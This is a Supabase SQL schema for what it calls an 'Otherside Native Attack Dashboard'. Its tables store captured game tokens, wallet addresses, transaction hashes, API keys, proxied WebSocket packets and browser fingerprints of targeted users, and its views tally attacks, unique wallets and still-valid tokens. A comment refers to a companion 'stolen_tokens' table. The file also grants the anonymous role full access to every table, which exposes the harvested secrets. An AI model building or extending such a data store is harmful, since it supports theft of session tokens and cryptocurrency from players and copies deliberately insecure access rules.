-- Otherside Native Attack Dashboard - Supabase Schema
-- Table: otherside_attack_logs (os_ prefix, separate from stolen_tokens)
-- All columns prefixed with os_ to avoid conflicts with the first project

CREATE TABLE IF NOT EXISTS otherside_attack_logs (
    id BIGSERIAL PRIMARY KEY,
    os_capture_timestamp TIMESTAMPTZ DEFAULT NOW(),
    os_attack_phase TEXT NOT NULL,
    os_target_endpoint TEXT,
    os_response_status INTEGER,
    os_response_data JSONB,
    os_error_message TEXT,
    os_source_domain TEXT,
    os_operator_agent TEXT,
    os_operator_screen TEXT,
    os_operator_language TEXT,
    os_operator_timezone TEXT,
    os_operator_referrer TEXT,
    os_captured_token TEXT,
    os_captured_token_type TEXT,
    os_wallet_address TEXT,
    os_chain_id TEXT,
    os_transaction_hash TEXT,
    os_api_key_used TEXT,
    os_request_method TEXT,
    os_request_body JSONB,
    os_notes TEXT
);

-- Index for fast queries by phase
CREATE INDEX IF NOT EXISTS idx_os_attack_phase ON otherside_attack_logs(os_attack_phase);
CREATE INDEX IF NOT EXISTS idx_os_capture_timestamp ON otherside_attack_logs(os_capture_timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_os_wallet_address ON otherside_attack_logs(os_wallet_address);

-- Enable RLS but allow anon access (for the dashboard)
ALTER TABLE otherside_attack_logs ENABLE ROW LEVEL SECURITY;

-- Allow inserts from the dashboard (anon key)
CREATE POLICY "Allow anon inserts" ON otherside_attack_logs
    FOR INSERT WITH CHECK (true);

-- Allow selects from the dashboard (anon key)
CREATE POLICY "Allow anon selects" ON otherside_attack_logs
    FOR SELECT USING (true);

-- Table for captured game tokens (from local proxy)
CREATE TABLE IF NOT EXISTS otherside_captured_tokens (
    id BIGSERIAL PRIMARY KEY,
    os_capture_time TIMESTAMPTZ DEFAULT NOW(),
    os_token_type TEXT NOT NULL,
    os_token_value TEXT NOT NULL,
    os_source TEXT,
    os_wallet_address TEXT,
    os_chain_id TEXT,
    os_expires_at TIMESTAMPTZ,
    os_is_valid BOOLEAN DEFAULT true,
    os_metadata JSONB
);

CREATE INDEX IF NOT EXISTS idx_os_token_type ON otherside_captured_tokens(os_token_type);
CREATE INDEX IF NOT EXISTS idx_os_capture_time ON otherside_captured_tokens(os_capture_time DESC);

ALTER TABLE otherside_captured_tokens ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow anon inserts tokens" ON otherside_captured_tokens FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow anon selects tokens" ON otherside_captured_tokens FOR SELECT USING (true);

-- Table for API test results (from API Hub)
CREATE TABLE IF NOT EXISTS otherside_api_results (
    id BIGSERIAL PRIMARY KEY,
    os_test_time TIMESTAMPTZ DEFAULT NOW(),
    os_api_provider TEXT NOT NULL,
    os_endpoint TEXT NOT NULL,
    os_method TEXT DEFAULT 'GET',
    os_request_headers JSONB,
    os_request_body JSONB,
    os_response_status INTEGER,
    os_response_body JSONB,
    os_api_key_used TEXT,
    os_success BOOLEAN DEFAULT false,
    os_latency_ms INTEGER,
    os_notes TEXT
);

CREATE INDEX IF NOT EXISTS idx_os_api_provider ON otherside_api_results(os_api_provider);
CREATE INDEX IF NOT EXISTS idx_os_test_time ON otherside_api_results(os_test_time DESC);

ALTER TABLE otherside_api_results ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow anon inserts api" ON otherside_api_results FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow anon selects api" ON otherside_api_results FOR SELECT USING (true);

-- Table for WebSocket session captures (from Morpheus/local proxy)
CREATE TABLE IF NOT EXISTS otherside_ws_captures (
    id BIGSERIAL PRIMARY KEY,
    os_capture_time TIMESTAMPTZ DEFAULT NOW(),
    os_session_id TEXT,
    os_direction TEXT,
    os_packet_type TEXT,
    os_packet_size INTEGER,
    os_packet_data TEXT,
    ws_url TEXT,
    os_is_binary BOOLEAN DEFAULT false,
    os_metadata JSONB
);

CREATE INDEX IF NOT EXISTS idx_os_ws_session ON otherside_ws_captures(os_session_id);
CREATE INDEX IF NOT EXISTS idx_os_capture_time_ws ON otherside_ws_captures(os_capture_time DESC);

ALTER TABLE otherside_ws_captures ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow anon inserts ws" ON otherside_ws_captures FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow anon selects ws" ON otherside_ws_captures FOR SELECT USING (true);

-- Grant permissions
GRANT ALL ON ALL TABLES IN SCHEMA public TO anon;
GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO anon;
GRANT ALL ON ALL TABLES IN SCHEMA public TO service_role;
GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO service_role;

-- Useful views
CREATE OR REPLACE VIEW otherside_attack_summary AS
SELECT 
    os_attack_phase,
    COUNT(*) as total_attacks,
    COUNT(DISTINCT os_wallet_address) as unique_wallets,
    COUNT(CASE WHEN os_response_status = 200 THEN 1 END) as successful,
    MIN(os_capture_timestamp) as first_seen,
    MAX(os_capture_timestamp) as last_seen
FROM otherside_attack_logs
GROUP BY os_attack_phase
ORDER BY total_attacks DESC;

CREATE OR REPLACE VIEW otherside_token_summary AS
SELECT
    os_token_type,
    COUNT(*) as total_tokens,
    COUNT(CASE WHEN os_is_valid THEN 1 END) as valid_tokens,
    MIN(os_capture_time) as first_capture,
    MAX(os_capture_time) as last_capture
FROM otherside_captured_tokens
GROUP BY os_token_type
ORDER BY total_tokens DESC;

CREATE OR REPLACE VIEW otherside_api_summary AS
SELECT
    os_api_provider,
    os_endpoint,
    COUNT(*) as total_requests,
    AVG(os_latency_ms) as avg_latency,
    COUNT(CASE WHEN os_success THEN 1 END) as successful,
    MIN(os_test_time) as first_test,
    MAX(os_test_time) as last_test
FROM otherside_api_results
GROUP BY os_api_provider, os_endpoint
ORDER BY total_requests DESC;
